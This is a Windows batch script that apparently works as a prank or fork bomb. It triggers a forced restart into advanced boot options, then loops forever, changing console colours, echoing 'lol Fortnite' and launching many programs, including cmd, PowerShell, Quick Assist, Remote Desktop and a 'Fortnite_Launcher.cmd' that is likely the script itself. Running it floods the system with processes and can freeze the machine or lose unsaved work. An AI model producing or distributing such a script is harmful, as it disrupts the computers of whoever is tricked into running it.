@echo off
shutdown /r /o
:1
set /a rand1=%random% %% 16
set /a rand2=%random% %% 16
set HEX=0123456789ABCDEF
call set hexcolors=%%HEX:~%rand1%,1%%%%HEX:~%rand2%,1%%
color %hexcolors%
echo lol Fortnite
start cmd.exe
start calc.exe
start explorer.exe
start quickassist.exe
start mstsc.exe
start powershell.exe
start mmc.exe
start msiexec.exe
start ssh-keygen.exe
start notepad.exe
start winver.exe
start maus.jpg
start Fortnite_Launcher.cmd
goto :1